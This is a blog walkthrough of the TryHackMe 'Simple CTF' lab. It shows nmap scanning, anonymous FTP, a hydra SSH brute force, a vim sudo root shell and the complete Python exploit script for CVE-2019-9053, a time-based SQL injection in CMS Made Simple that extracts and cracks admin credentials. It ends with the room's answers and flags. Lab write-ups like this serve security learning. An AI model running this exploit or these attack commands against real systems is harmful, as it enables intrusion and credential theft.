---
title: "Simple CTF"
date: 2026-05-02
category: "ctf"
excerpt: "Walkthrough of the TryHackMe Simple CTF challenge - Beginner level ctf"
image: "/images/blog/102.png"
readtime: "35 min read"
draft: false
---

# Simple CTF

Another guided one. The questions basically hold your hand through the whole thing. Let's get into it.

---

## Recon

Same as always, nmap first.

```bash
nmap -sCV 10.112.154.104
```

Three open ports. `21` (FTP), `80` (HTTP), and `2222` (SSH on a non-standard port). Not a lot going on here.

The reason I use the `-sCV` flags is because I want to grab the version info on each service. If something is running an old unpatched version, that is a free ticket in most of the time.

---

## FTP

Looking at the nmap output for port 21, it says anonymous login is allowed.

![](/images/blog/simple-ctf/1.png)

That means I can just walk in with no password.

```bash
ftp 10.112.154.104
```

When it asked for a name I typed `anonymous` and hit enter. No password needed. I was in.

![](/images/blog/simple-ctf/2.png)

Then things got annoying. Every command I ran was throwing back:

```bash
229 Entering Extended Passive Mode
```

One quick search online and the fix is just typing `passive` to toggle passive mode off and then everything works normally. Small thing but it wasted a few minutes.

```bash
passive
```

There is a directory called `pub`.

Inside it there is a file called `ForMitch.txt`. You cannot cat files from inside FTP so I had to download it first.

```bash
get ForMitch.txt
```

![](/images/blog/simple-ctf/3.png)

Then on my machine:

```bash
cat ForMitch.txt
```

The message reads:

```
Dammit man... you're the worst dev i've seen. You set the same pass for the system
user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```

![](/images/blog/simple-ctf/4.png)

Okay. So I have a name now, `Mitch`, and I know he has a weak password on his system account. This is basically a sign pointing at SSH brute force.

---

## SSH Brute Force

Hydra, let's go.

```bash
hydra -l mitch -s 2222 -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://10.112.154.104
```

The `-s 2222` flag is just telling hydra to use a different port since SSH is not on the default 22 here.

It cracked it pretty fast. Password is `secret`. Fitting.

![](/images/blog/simple-ctf/5.png)

```bash
ssh mitch@10.112.154.104 -p 2222
```

Inside.

![](/images/blog/simple-ctf/6.png)

---

## Privilege Escalation

First thing as always:

```bash
sudo -l
```

![](/images/blog/simple-ctf/7.png)

Mitch can run `/usr/bin/vim` as root with no password. That is all I needed to see.

I checked GTFOBins for the vim entry and the command is:

```bash
sudo vim -c ':!/bin/sh'
```

What this does is open vim and immediately run a shell command from inside it. The `-c` flag tells vim to execute whatever comes after it as a command. `:!` in vim means run this as a shell command. So it just drops you straight into a shell running as root.

![](/images/blog/simple-ctf/8.png)

And just like that, I am root.

```bash
ls -la /home
```

![](/images/blog/simple-ctf/9.png)

There is another user called `sunbath`. And inside Mitch's home directory there is a `user.txt`.

```bash
cat user.txt
```

![](/images/blog/simple-ctf/10.png)

```bash
G00d j0b, keep up!
```

Then:

```bash
cat root.txt
```

![](/images/blog/simple-ctf/11.png)

```bash
W3ll d0n3. You made it!
```

At this point I thought I was done. I was not done.

---

## The Part I Almost Missed

Going back to answer all the questions I realized there were two I could not answer. One asking about a CVE and one about what kind of vulnerability the application is vulnerable to. I had not touched port 80 at all beyond loading the default Apache page and bouncing off it.

So I went back and ran gobuster.

```bash
gobuster dir -u http://10.112.154.104 -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

There is a `/simple` path.

![](/images/blog/simple-ctf/12.png)

Opening it up shows a CMS. Something like WordPress but it is called CMS Made Simple. Scrolling all the way to the bottom of the page I can see it is running version `2.2.8`.

The `/simple` page also has an admin login at `/simple/admin` which is what the exploit is targeting. 

![](/images/blog/simple-ctf/14.png)

![](/images/blog/simple-ctf/15.png)

One search for that version and the CVE comes right up. `CVE-2019-9053`.

![](/images/blog/simple-ctf/13.png)

The short version is that the News module in CMS Made Simple takes a URL parameter called `m1_idlist` and it does not sanitize it at all. So you can craft a URL that asks the database questions and figure out the answer based on how long the server takes to respond. It cannot read the database directly, it just times the responses. Does the password start with `a`? If the page is slow, yes. If it is fast, no. It goes character by character like that until it has the whole thing. That is called blind time-based SQL injection.

I found the exploit script on Exploit-DB but it was Python 2. I found a Python 3 version of it and used that instead.

```python
#!/usr/bin/env python
# Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9
# Date: 30-03-2019
# Exploit Author: Daniele Scanu @ Certimeter Group
# Vendor Homepage: https://www.cmsmadesimple.org/
# Software Link: https://www.cmsmadesimple.org/downloads/cmsms/
# Version: <= 2.2.9
# Tested on: Ubuntu 18.04 LTS
# CVE : CVE-2019-9053

# Python 3 Version
# Date: 28-12-2021
# Ported by: Enrico Renna
# Tested on: Python 3.10.1

import requests
import time
import optparse
import hashlib
import subprocess


try:
    from termcolor import colored
    from termcolor import cprint

except:
    print("[-] Termcolor Not Found\nInstalling...")
    subprocess.call([ "pip3", "install", "subprocess" ])


parser = optparse.OptionParser()
parser.add_option('-u', '--url', action="store", dest="url", help="Base target uri (ex. http://10.10.10.100/cms)")
parser.add_option('-w', '--wordlist', action="store", dest="wordlist", help="Wordlist for crack admin password")
parser.add_option('-c', '--crack', action="store_true", dest="cracking", help="Crack password with wordlist",
                  default=False)

options, args = parser.parse_args()
if not options.url:
    print("[+] Specify an url target")
    print("[+] Example usage (no cracking password): exploit.py -u http://target-uri")
    print("[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist")
    print("[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.")
    exit()

url_vuln = options.url + '/moduleinterface.php?mact=News,m1_,default,0'
session = requests.Session()
dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'
flag = True
password = ""
temp_password = ""
TIME = 1
db_name = ""
output = ""
email = ""

salt = ''
wordlist = ""
if options.wordlist:
    wordlist += options.wordlist


def crack_password():
    global password
    global output
    global wordlist
    global salt
    word_dict = open(wordlist, encoding='latin-1')
    for line in word_dict.readlines():
        line = line.replace("\n", "")
        beautify_print_try(line)
        if hashlib.md5((str(salt) + line).encode("utf-8")).hexdigest() == password:
            output += "\n[+] Password cracked: " + line
            break
    word_dict.close()


def beautify_print_try(value):
    global output
    print("\033c")
    cprint(output, 'green', attrs=['bold'])
    cprint('[*] Try: ' + value, 'red', attrs=['bold'])


def beautify_print():
    global output
    print("\033c")
    cprint(output, 'green', attrs=['bold'])


def dump_salt():
    global flag
    global salt
    global output
    ord_salt = ""
    ord_salt_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_salt = salt + dictionary[i]
            ord_salt_temp = ord_salt + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_salt)
            payload = "a,b,1,5))+and+(select+sleep(" + str(
                TIME) + ")+from+cms_siteprefs+where+sitepref_value+like+0x" + ord_salt_temp \
                      + "25+and+sitepref_name+like+0x736974656d61736b)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            salt = temp_salt
            ord_salt = ord_salt_temp
    flag = True
    output += '\n[+] Salt for password found: ' + salt


def dump_password():
    global flag
    global password
    global output
    ord_password = ""
    ord_password_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_password = password + dictionary[i]
            ord_password_temp = ord_password + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_password)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users"
            payload += "+where+password+like+0x" + ord_password_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            password = temp_password
            ord_password = ord_password_temp
    flag = True
    output += '\n[+] Password found: ' + password


def dump_username():
    global flag
    global db_name
    global output
    ord_db_name = ""
    ord_db_name_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_db_name = db_name + dictionary[i]
            ord_db_name_temp = ord_db_name + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_db_name)
            payload = "a,b,1,5))+and+(select+sleep(" + str(
                TIME) + ")+from+cms_users+where+username+like+0x" + ord_db_name_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            db_name = temp_db_name
            ord_db_name = ord_db_name_temp
    output += '\n[+] Username found: ' + db_name
    flag = True


def dump_email():
    global flag
    global email
    global output
    ord_email = ""
    ord_email_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_email = email + dictionary[i]
            ord_email_temp = ord_email + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_email)
            payload = "a,b,1,5))+and+(select+sleep(" + str(
                TIME) + ")+from+cms_users+where+email+like+0x" + ord_email_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            email = temp_email
            ord_email = ord_email_temp
    output += '\n[+] Email found: ' + email
    flag = True


dump_salt()
dump_username()
dump_email()
dump_password()

if options.cracking:
    print(colored("[*] Now try to crack password"))
    crack_password()

beautify_print()
```

I created a file on my machine, pasted the code in, and ran it:

```bash
python3 exploit.py -u http://10.112.154.104/simple --crack -w /usr/share/wordlists/rockyou.txt
```

It goes through the whole process, dumps the salt, the username, the email, the password hash, and then cracks the hash against rockyou. It takes a while because of the time delays baked into the injection but it gets there. It comes back with Mitch's credentials, the same ones I already had. So both paths lead to the same place.

![](/images/blog/simple-ctf/16.png)

Now I could also log in to his CMS dashboard too.

![](/images/blog/simple-ctf/17.png)

---

## Answers

**How many services are running under port 1000?** `2`

**What is running on the higher port?** `ssh`

**What's the CVE you're using against the application?** `CVE-2019-9053`

**To what kind of vulnerability is the application vulnerable?** `sqli`

**What's the password?** `secret`

**Where can you login with the details obtained?** `ssh`

**What's the user flag?** `G00d j0b, keep up!`

**Is there any other user in the home directory? What's its name?** `sunbath`

**What can you leverage to spawn a privileged shell?** `vim`

**What's the root flag?** `W3ll d0n3. You made it!`

---

## Takeaway

Pretty fun room overall. The FTP passive mode thing tripped me up for a bit which was annoying but also kind of realistic, that stuff happens. The vim privilege escalation was clean and satisfying once I found it on GTFOBins.

The part I almost completely missed was the web side. I basically ignored port 80 after seeing the default Apache page and went straight for SSH. It worked out but I would have had a gap in my answers if I did not go back. Good reminder to actually enumerate everything even when you find a way in early.

Two ways into the same account which was a nice touch from the room design.

---
